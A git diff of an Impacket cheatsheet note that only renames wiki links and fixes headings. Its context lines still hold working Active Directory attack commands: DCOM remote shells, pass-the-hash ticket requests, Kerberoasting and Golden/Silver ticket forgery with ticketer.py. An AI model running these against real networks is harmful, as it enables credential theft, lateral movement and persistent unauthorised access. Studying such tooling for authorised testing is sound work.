@@ -11,7 +11,7 @@ From [Impacket Github](https://github.com/SecureAuthCorp/impacket)
 -   Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, BKRP, DHCPM, EVEN6, MGMT, SASEC, TSCH, DCOM, WMI, OXABREF, NSPI, OXNSPI.
 -   Portions of TDS (MSSQL) and LDAP protocol implementations.
 
-Impacket is an awesome suite of scripts written in python that are incorpated into tools like [[Crackmapexec-Cheatsheet]]. It is very useful suite of tools for [[Active-Directory-Enumeration]], [[Foothold-On-AD]], [[Attacking-Kerberos]], [[Windows-Network-Lateral-Movement]] and general [[Active-Directory-Privilege-Escalation]].
+Impacket is an awesome suite of scripts written in python that are incorpated into tools like [[Crackmapexec-Cheatsheet]]. It is very useful suite of tools for [[Active-Directory-Enumeration]], [[Foothold-On-AD]], [[Attacking-Kerberos]], [[Active-Directory-Lateral-Movement]] and general [[Active-Directory-Privilege-Escalation]].
 
 Haak9 Technical tips
 ```bash
@@ -36,7 +36,7 @@ kinit user
 ```
 
 ## dccomexec.py 
-Useful for [[Windows-Network-Lateral-Movement]].  A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.
+Useful for [[Active-Directory-Lateral-Movement]].  A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.
 ```bash
 dccomexec.py $domain/$username:$password@$IP <command>
 ```
@@ -77,7 +77,7 @@ switch to request the ticket on behalf another user.
 getST.py -hashes $lm:$nt -spn $spn/$spn-dc $domain$/$user
 ```
 
-# GetUserSPNs.py
+## GetUserSPNs.py
 This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat.
 ```bash
 GetUserSPNs.py -dc-ip $dc-ip $spn.info/$notanadmin
@@ -150,7 +150,7 @@ copy \\$ip\$Sharename\bad.exe
 cd $Share:
 ```
 
-## ticketer
+## ticketer.py
 This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC).
 ```bash
 ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
